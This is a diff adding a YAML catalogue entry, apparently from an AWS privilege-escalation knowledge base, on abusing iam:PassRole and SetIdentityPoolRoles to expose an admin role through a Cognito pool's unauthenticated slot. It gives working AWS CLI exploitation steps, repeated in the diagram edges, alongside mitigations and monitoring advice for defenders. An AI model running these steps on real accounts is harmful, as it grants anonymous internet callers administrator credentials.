@@ -1,0 +1,276 @@
+id: cognitoidentity-001
+name: iam:PassRole + cognito-identity:SetIdentityPoolRoles
+category: new-passrole
+services:
+  - iam
+  - cognito-identity
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role to the Cognito Identity service
+    - permission: cognito-identity:SetIdentityPoolRoles
+      resourceConstraints: Must have access to the target identity pool ID
+  additional:
+    - permission: cognito-identity:ListIdentityPools
+      resourceConstraints: Helpful for discovering existing identity pools to target
+    - permission: cognito-identity:DescribeIdentityPool
+      resourceConstraints: Useful for viewing identity pool configuration and current role assignments
+    - permission: cognito-identity:GetIdentityPoolRoles
+      resourceConstraints: Useful for verifying the current role assignments before and after exploitation
+    - permission: iam:ListRoles
+      resourceConstraints: Helpful for discovering available admin roles to pass
+    - permission: iam:GetRole
+      resourceConstraints: Useful for viewing role trust policies and confirming roles trust cognito-identity.amazonaws.com
+
+description: A principal with `iam:PassRole` and `cognito-identity:SetIdentityPoolRoles` can bind an admin IAM role to an existing Cognito Identity Pool's unauthenticated identity slot. Once bound, any unauthenticated caller — including the attacker — can call `cognito-identity:GetId` and `cognito-identity:GetCredentialsForIdentity` (or `cognito-identity:GetOpenIdToken` + `sts:AssumeRoleWithWebIdentity`) to obtain temporary AWS credentials scoped to the admin role. This effectively turns the identity pool into a public, unauthenticated STS credential-vending endpoint. No separate execution environment (Lambda, EC2, container) is required; the attacker retrieves and uses the credentials directly.
+
+prerequisites:
+  admin:
+    - An existing Cognito Identity Pool must be present with unauthenticated access enabled
+    - A role must exist that trusts cognito-identity.amazonaws.com to assume it (with the sts:AssumeRoleWithWebIdentity action in its trust policy)
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - An existing Cognito Identity Pool must be present with unauthenticated access enabled
+    - A role must exist that trusts cognito-identity.amazonaws.com and has elevated permissions
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws cognito-identity list-identity-pools \
+          --max-results 60 \
+          --query 'IdentityPools[*].{id:IdentityPoolId,name:IdentityPoolName}' \
+          --output table
+      description: Enumerate existing Cognito Identity Pools to find targets with unauthenticated access enabled.
+    - step: 2
+      command: |
+        aws cognito-identity set-identity-pool-roles \
+          --identity-pool-id IDENTITY_POOL_ID \
+          --roles unauthenticated=arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE
+      description: Bind the admin IAM role to the pool's unauthenticated identity slot via iam:PassRole. This returns HTTP 200 with an empty body on success. Any unauthenticated caller can now vend credentials for this role.
+    - step: 3
+      command: |
+        IDENTITY_ID=$(aws cognito-identity get-id \
+          --no-sign-request \
+          --account-id ACCOUNT_ID \
+          --identity-pool-id IDENTITY_POOL_ID \
+          --query 'IdentityId' \
+          --output text)
+
+        echo "Identity ID: $IDENTITY_ID"
+      description: Obtain a Cognito identity ID from the pool using --no-sign-request, demonstrating that no IAM credentials are required. Any internet caller can perform this step.
+    - step: 4
+      command: |
+        OPENID_TOKEN=$(aws cognito-identity get-open-id-token \
+          --no-sign-request \
+          --identity-id IDENTITY_ID \
+          --query 'Token' \
+          --output text)
+
+        aws sts assume-role-with-web-identity \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --role-session-name privesc-session \
+          --web-identity-token $OPENID_TOKEN
+      description: Use the Cognito identity to obtain an OpenID token (no credentials required), then exchange it for temporary admin role credentials via sts:AssumeRoleWithWebIdentity.
+    - step: 5
+      command: |
+        AWS_ACCESS_KEY_ID=TEMP_KEY_ID \
+        AWS_SECRET_ACCESS_KEY=TEMP_SECRET \
+        AWS_SESSION_TOKEN=TEMP_TOKEN \
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      description: Use the obtained temporary admin credentials to attach AdministratorAccess to the starting user.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative roles as Cognito unauthenticated identity roles** - Cognito unauthenticated identities are designed for anonymous app users; they should have extremely limited permissions (e.g., read access to specific public S3 objects), never administrative access.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificCognitoUnauthRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "cognito-identity.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Disable unauthenticated access on identity pools unless required** - Most Cognito Identity Pools for authenticated user flows do not need unauthenticated access enabled. Disabling it prevents this attack vector entirely.
+  - **Monitor `cognito-identity:SetIdentityPoolRoles` calls** - This API is used infrequently and any unexpected call should be treated as a high-severity alert, especially if it modifies the unauthenticated role.
+  - Monitor CloudTrail for identity pool role modifications that bind privileged roles to the unauthenticated slot
+  - Alert on any `cognito-identity:SetIdentityPoolRoles` call outside of approved CI/CD processes
+  - Regularly audit Cognito Identity Pools for administrative roles assigned to unauthenticated identity slots
+
+limitations: |
+  This path is unique among PassRole escalation paths in that no execution environment (Lambda, EC2, container, etc.) is required — the credential vending happens directly through Cognito's public STS endpoint. The attack persists until someone calls `SetIdentityPoolRoles` again to reassign the unauthenticated role, meaning the admin credential endpoint remains available to any internet caller until manually remediated.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon Cognito Identity - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoncognitoidentity.html"
+  - title: "Abusing Overpermissioned AWS Cognito Identity Pools - Hacking The Cloud"
+    url: "https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/"
+  - title: "Using role-based access control - Amazon Cognito"
+    url: "https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/cognito-identity-001-iam-passrole+cognito-identity-setidentitypoolroles"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole` and `cognito-identity:SetIdentityPoolRoles` permissions. Can be an IAM user or role.
+
+    - id: identity_pool
+      label: Cognito Identity Pool (unauthenticated)
+      type: resource
+      description: |
+        An existing Cognito Identity Pool with unauthenticated access enabled. The attacker calls `cognito-identity:SetIdentityPoolRoles` to rebind the unauthenticated slot to an admin IAM role, turning the pool into a public credential-vending endpoint.
+
+        The pool must have unauthenticated identities allowed. This is a configuration flag on the pool that permits callers without Cognito login credentials to obtain an identity ID and exchange it for AWS credentials.
+
+    - id: admin_role
+      label: Admin Role (bound to unauthenticated slot)
+      type: principal
+      description: |
+        The IAM role passed to the Cognito unauthenticated slot via `iam:PassRole`. The role must have a trust policy allowing `cognito-identity.amazonaws.com` to assume it via `sts:AssumeRoleWithWebIdentity`.
+
+        Once bound, the role's temporary credentials become available to any internet caller — no AWS credentials required to retrieve them. This attack persists until someone calls `SetIdentityPoolRoles` again to reassign the unauthenticated role.
+
+    - id: public_caller
+      label: Any Internet Caller (no credentials)
+      type: resource
+      description: Any unauthenticated internet caller — including the attacker themselves — can obtain a Cognito identity ID from the pool using `--no-sign-request`. No IAM credentials or authentication are required. This is what makes this escalation path unique among PassRole attacks.
+
+    - id: sts_endpoint
+      label: Cognito STS Credential Vending
+      type: resource
+      description: |
+        Cognito's public STS credential-vending endpoint. After obtaining a Cognito identity ID (step 3), the caller exchanges it for an OpenID token via `cognito-identity:GetOpenIdToken` (unsigned), then calls `sts:AssumeRoleWithWebIdentity` to receive temporary AWS credentials for the admin role.
+
+        Alternatively, `cognito-identity:GetCredentialsForIdentity` can retrieve credentials in a single call. Both flows require no IAM signing.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: The admin role has AdministratorAccess or equivalent permissions. Any internet caller can now obtain temporary admin credentials from Cognito and perform any action in the AWS account. The escalation persists indefinitely until manually remediated.
+
+    - id: some
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The bound role has elevated but non-admin permissions. Any internet caller can obtain credentials scoped to those permissions. Useful for data access (S3, RDS, DynamoDB) or as a stepping stone for additional privilege escalation paths.
+
+    - id: no
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The bound role has only minimal permissions (e.g., read access to a specific public S3 prefix). While the attack succeeds technically, the credentials vended provide little practical value.
+
+  edges:
+    - from: start
+      to: identity_pool
+      label: iam:PassRole + cognito-identity:SetIdentityPoolRoles
+      description: |
+        Bind the admin IAM role to the identity pool's unauthenticated slot. The `iam:PassRole` permission authorizes passing the role to the Cognito service. This single API call transforms the pool into a public credential endpoint.
+
+        Command:
+        ```bash
+        aws cognito-identity set-identity-pool-roles \
+          --identity-pool-id IDENTITY_POOL_ID \
+          --roles unauthenticated=arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE
+        ```
+
+        Returns HTTP 200 with an empty body on success.
+
+    - from: identity_pool
+      to: admin_role
+      label: Unauthenticated slot bound to admin role
+      description: The identity pool now maps all unauthenticated identity requests to the admin role. Any caller who obtains a Cognito identity ID from this pool will receive temporary credentials scoped to the admin role when they exchange it via `GetCredentialsForIdentity` or `GetOpenIdToken` + `AssumeRoleWithWebIdentity`.
+
+    - from: public_caller
+      to: sts_endpoint
+      label: cognito-identity:GetId + GetCredentialsForIdentity (no signing)
+      description: |
+        Any internet caller obtains a Cognito identity ID and exchanges it for temporary AWS credentials — both API calls require no IAM signing (`--no-sign-request`). This is unique to Cognito: no AWS credentials are needed to start the credential vending flow.
+
+        Step 1 — Get identity ID (unsigned):
+        ```bash
+        IDENTITY_ID=$(aws cognito-identity get-id \
+          --no-sign-request \
+          --account-id ACCOUNT_ID \
+          --identity-pool-id IDENTITY_POOL_ID \
+          --query 'IdentityId' \
+          --output text)
+        ```
+
+        Step 2 — Exchange for admin credentials via OpenID token (unsigned):
+        ```bash
+        OPENID_TOKEN=$(aws cognito-identity get-open-id-token \
+          --no-sign-request \
+          --identity-id $IDENTITY_ID \
+          --query 'Token' \
+          --output text)
+
+        aws sts assume-role-with-web-identity \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --role-session-name privesc-session \
+          --web-identity-token $OPENID_TOKEN
+        ```
+
+    - from: sts_endpoint
+      to: admin_role
+      label: Temporary credentials for admin role vended
+      description: |
+        STS returns temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) scoped to the admin role. The attacker configures the AWS CLI with these credentials and operates as the admin role.
+
+        Use the credentials:
+        ```bash
+        AWS_ACCESS_KEY_ID=TEMP_KEY_ID \
+        AWS_SECRET_ACCESS_KEY=TEMP_SECRET \
+        AWS_SESSION_TOKEN=TEMP_TOKEN \
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        ```
+
+        This attack persists for any internet caller until someone calls `SetIdentityPoolRoles` again to reassign or remove the unauthenticated role binding.
+
+    - from: admin_role
+      to: admin_outcome
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: If the bound role has AdministratorAccess or equivalent permissions, any internet caller can obtain full administrative credentials without any AWS account access. This is the worst-case outcome.
+
+    - from: admin_role
+      to: some
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the bound role has elevated but non-admin permissions, the vended credentials enable data access or lateral movement. Further escalation may be possible depending on what the role can do.
+
+    - from: admin_role
+      to: no
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the bound role has only minimal permissions, the vended credentials provide little practical value despite the attack succeeding technically.
